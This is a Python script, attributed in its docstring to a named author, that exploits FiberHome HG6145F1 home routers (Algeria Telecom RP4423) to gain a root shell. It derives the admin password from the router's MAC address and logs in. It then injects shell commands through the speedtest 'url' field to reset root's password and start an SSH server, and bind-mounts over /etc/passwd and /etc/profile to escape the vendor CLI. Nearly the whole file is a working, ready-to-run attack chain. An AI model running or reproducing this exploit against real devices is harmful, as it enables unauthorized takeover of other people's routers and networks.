#!/usr/bin/env python3
"""
FiberHome HG6145F1 (Algeria Telecom RP4423) — Full Root Shell Access
By Smothy (Rayane Merzoug) / Numb Team

Chains: CVE-5 (unauth MAC leak) → CVE-1 (MAC→password) → CVE-4 (RCE) → Root SSH

Usage: python3 get_root.py [MAC]
  - If MAC not provided, auto-detects from ARP table
  - Logs into admin panel, enables SSH via RCE, fixes shell, connects
"""

import hashlib
import re
import sys
import os
import subprocess
import time

try:
    from Crypto.Cipher import AES
except ImportError:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    AES = None

try:
    import requests
except ImportError:
    print("pip install requests pycryptodome")
    sys.exit(1)

ROUTER = "http://192.168.1.1"
ROUTER_IP = "192.168.1.1"
SSH_PORT = "2222"
SSH_PASS = "root123"
AES_KEY = bytes(range(65, 81))  # ABCDEFGHIJKLMNOP

# ── Password Generation (CVE-1) ──────────────────────────────────────────────

UPPER = "ACDFGHJMNPRSTUWXY"
LOWER = "abcdfghjkmpstuwxy"
DIGIT = "2345679"
SYMBOL = "!@$&%"

def mac_to_pass(mac: str) -> str:
    if not re.fullmatch(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac):
        return ""
    md5 = hashlib.md5()
    md5.update(mac.encode())
    md5.update(b"AEJLY")
    digest = md5.hexdigest()
    vals = []
    for c in digest[:20]:
        if '0' <= c <= '9': vals.append(ord(c) - ord('0'))
        elif 'a' <= c <= 'f': vals.append(ord(c) - ord('a') + 10)
        elif 'A' <= c <= 'F': vals.append(ord(c) - ord('A') + 10)
        else: vals.append(0)
    password = [''] * 16
    for i in range(16):
        v = vals[i]
        case_type = v % 4
        if case_type == 0:   password[i] = UPPER[(v * 2) % 17]
        elif case_type == 1: password[i] = LOWER[(v * 2 + 1) % 17]
        elif case_type == 2: password[i] = DIGIT[6 - (v % 7)]
        elif case_type == 3: password[i] = SYMBOL[4 - (v % 5)]
    p0 = (vals[16] + 1) % 16
    p1 = (vals[17] + 1) % 16
    while p1 == p0: p1 = (p1 + 1) % 16
    p2 = (vals[18] + 1) % 16
    while p2 == p0 or p2 == p1: p2 = (p2 + 1) % 16
    p3 = (vals[19] + 1) % 16
    while p3 == p0 or p3 == p1 or p3 == p2: p3 = (p3 + 1) % 16
    password[p0] = UPPER[(vals[16] * 2) % 17]
    password[p1] = LOWER[(vals[17] * 2 + 1) % 17]
    password[p2] = DIGIT[6 - (vals[18] % 7)]
    password[p3] = SYMBOL[4 - (vals[19] % 5)]
    return ''.join(password)

# ── AES Encryption (for login) ───────────────────────────────────────────────

def fhencrypt(plaintext):
    data = plaintext.encode()
    pad_len = 16 - (len(data) % 16)
    data += b'\x00' * pad_len
    if AES:
        cipher = AES.new(AES_KEY, AES.MODE_ECB)
        return cipher.encrypt(data).hex()
    else:
        cipher = Cipher(algorithms.AES(AES_KEY), modes.ECB())
        enc = cipher.encryptor()
        return (enc.update(data) + enc.finalize()).hex()

# ── MAC Detection ────────────────────────────────────────────────────────────

def get_mac_from_arp():
    try:
        out = subprocess.check_output(["ip", "neigh", "show", ROUTER_IP]).decode()
        for part in out.split():
            if ":" in part and len(part) == 17:
                return part.upper()
    except:
        pass
    return None

# ── Main Attack Chain ────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("FiberHome HG6145F1 — Root Shell Access")
    print("CVE-5 → CVE-1 → CVE-4 → Root SSH")
    print("=" * 60)

    # Step 1: Get MAC
    if len(sys.argv) > 1:
        mac = sys.argv[1].upper()
    else:
        print("\n[1] Getting router MAC from ARP table...")
        mac = get_mac_from_arp()
    if not mac:
        print("[-] Could not detect MAC. Provide as argument: python3 get_root.py XX:XX:XX:XX:XX:XX")
        sys.exit(1)
    print(f"[+] MAC: {mac}")

    # Step 2: Generate admin password (CVE-1)
    print("\n[2] Generating admin password (CVE-1: predictable password)...")
    password = mac_to_pass(mac)
    if not password:
        print("[-] Invalid MAC format")
        sys.exit(1)
    print(f"[+] Password: {password}")

    # Step 3: Login
    print("\n[3] Logging into admin panel...")
    s = requests.Session()
    sid = s.get(f"{ROUTER}/cgi-bin/ajax", params={"ajaxmethod": "get_refresh_sessionid"}).json()["sessionid"]
    r = s.post(f"{ROUTER}/cgi-bin/ajax", data={
        "ajaxmethod": "do_login",
        "username": "admin",
        "loginpd": fhencrypt(password),
        "port": "0",
        "sessionid": sid
    })
    result = r.json().get("login_result", -1)
    if result not in (0, 1):  # 0=success, 1=already logged in
        print(f"[-] Login failed (result={result})")
        sys.exit(1)
    print(f"[+] Login success")

    # Step 4: RCE to start SSH (CVE-4: command injection in triger_speedtest)
    print("\n[4] Enabling SSH via RCE (CVE-4: command injection)...")
    sid2 = s.get(f"{ROUTER}/cgi-bin/ajax", params={"ajaxmethod": "get_refresh_sessionid"}).json()["sessionid"]
    r2 = s.post(f"{ROUTER}/cgi-bin/ajax", data={
        "ajaxmethod": "triger_speedtest",
        "url": f";/fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa;echo root:{SSH_PASS}|chpasswd;/fhrom/bin/dropbear -p {SSH_PORT} -r /tmp/dbrsa",
        "sessionid": sid2
    })
    if '"ret":0' not in r2.text:
        print(f"[-] RCE failed: {r2.text}")
        sys.exit(1)
    print(f"[+] Dropbear SSH started on port {SSH_PORT}")

    # Step 5: Fix shell (rootfs is read-only, need mount --bind overlays)
    print("\n[5] Fixing login shell (bypassing FiberHome CLI)...")
    time.sleep(2)

    def ssh_cmd(cmd):
        return subprocess.run(
            ["sshpass", "-p", SSH_PASS, "ssh", f"-p{SSH_PORT}",
             "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             f"root@{ROUTER_IP}", cmd],
            capture_output=True, text=True, timeout=10
        )

    # Fix /etc/passwd: change shell from bin/sh to /bin/ash
    ssh_cmd('cp /etc/pass* /tmp/pwd; sed -i "s,:bin/sh,:/bin/ash," /tmp/pwd; mount -o bind /tmp/pwd /etc/pass*')

    # Neutralize fh_dropbear.sh (it launches load_cli instead of shell)
    ssh_cmd('echo "#!/bin/ash" > /tmp/noop.sh; chmod +x /tmp/noop.sh; mount -o bind /tmp/noop.sh /fhrom/fhshell/fh_dropbear.sh')

    # Clean /etc/profile (remove initialize.sh and CLI launch)
    ssh_cmd('printf "PS1=\\"root@HG6145F1# \\"\\nexport PATH=/fhrom/fhshell:/home/bin:/home/scripts:/opt/bin:/bin:/sbin:/usr/bin:/opt/scripts:/usr/sbin:/fhrom/bin\\nexport LD_LIBRARY_PATH=/lib:/lib/gpl:/lib64/gpl:/lib64:/usr/lib:/usr/lib64:/fhrom/lib\\n" > /tmp/prof; mount -o bind /tmp/prof /etc/profile')

    # Verify
    r = ssh_cmd("id")
    if "uid=0" in r.stdout:
        print("[+] Shell fixed — root access confirmed")
    else:
        print("[-] Shell fix may have failed, try connecting manually")

    # Step 6: Connect
    print("\n" + "=" * 60)
    print(f"[+] ROOT SHELL READY")
    print(f"[+] Connect: sshpass -p '{SSH_PASS}' ssh -p {SSH_PORT} root@{ROUTER_IP}")
    print("=" * 60)

    # Auto-connect
    print("\nConnecting...\n")
    os.execvp("sshpass", ["sshpass", "-p", SSH_PASS, "ssh", f"-p{SSH_PORT}",
              "-o", "StrictHostKeyChecking=no", f"root@{ROUTER_IP}"])

if __name__ == "__main__":
    main()
